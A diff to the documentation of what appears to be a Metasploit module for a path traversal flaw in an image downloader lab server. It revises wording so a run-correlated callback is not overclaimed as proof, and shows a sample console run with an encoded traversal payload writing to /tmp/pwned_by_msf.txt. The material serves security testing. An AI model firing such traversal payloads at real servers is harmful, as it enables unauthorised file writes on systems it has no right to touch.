@@ -56,10 +56,12 @@ callback response.
    `/tmp/downloads/`. This exact path is specific to the lab's configured
    destination and default `DEPTH=2`.
 
-Receiving the callback proves only that the target fetched the supplied URL.
-It does not prove that path traversal succeeded or that the file was written
-outside the configured destination. Verify the final path on the target before
-considering the vulnerability confirmed.
+A callback with the per-run query token shows that a request containing this
+run's token reached the listener. The token correlates the request but does not
+authenticate its network source. This does not prove the target made the request,
+that path traversal succeeded, or that the file was written outside the configured
+destination. Verify the final path on the target before considering the
+vulnerability confirmed.
 
 ## Options
 
@@ -82,8 +84,8 @@ filename is written to `/tmp/pwned_by_msf.txt`.
 
 ### CALLBACK_TIMEOUT
 
-The number of seconds to wait for the target to request the payload from the
-module's HTTP listener. The default value is `15`.
+The number of seconds to wait for a request containing this run's callback
+token to reach the module's listener. The default value is `15`.
 
 ## Scenarios
 
@@ -91,7 +93,7 @@ module's HTTP listener. The default value is `15`.
 
 The vulnerable lab server and Metasploit were run on the same host. When the
 target is remote, `SRVHOST` and `SRVPORT` must identify a listener that the
-target can reach.
+target can reach. If `SRVSSL` is enabled, the callback URL uses HTTPS.
 
 ```
 msf6 > use auxiliary/admin/http/image_downloader_path_traversal
@@ -108,11 +110,11 @@ msf6 auxiliary(admin/http/image_downloader_path_traversal) > run
 [*] Running module against 127.0.0.1
 [*] Using URL: http://127.0.0.1:8899/
 [*] Started payload listener on 127.0.0.1:8899
-[*] Callback URL: http://127.0.0.1:8899/%2e%2e%2f%2e%2e%2ftmp%2fpwned_by_msf.txt
+[*] Callback URL: http://127.0.0.1:8899/%2e%2e%2f%2e%2e%2ftmp%2fpwned_by_msf.txt?msf_callback=[redacted]
 [*] Triggering /download with traversal payload: /%2e%2e%2f%2e%2e%2ftmp%2fpwned_by_msf.txt
-[*] Payload fetched by 127.0.0.1 - GET /../../tmp/pwned_by_msf.txt
-[+] Target fetched the callback payload.
-[!] This confirms an outbound fetch only; it does not confirm path traversal or a file write.
+[*] Received run-correlated callback from 127.0.0.1 - GET /../../tmp/pwned_by_msf.txt
+[+] Received a callback request correlated to this run.
+[!] The request source is not authenticated; this does not confirm the target made the request.
 [!] Verify the final file location locally on the target before treating it as vulnerable.
 [*] Server stopped.
 [*] Auxiliary module execution completed
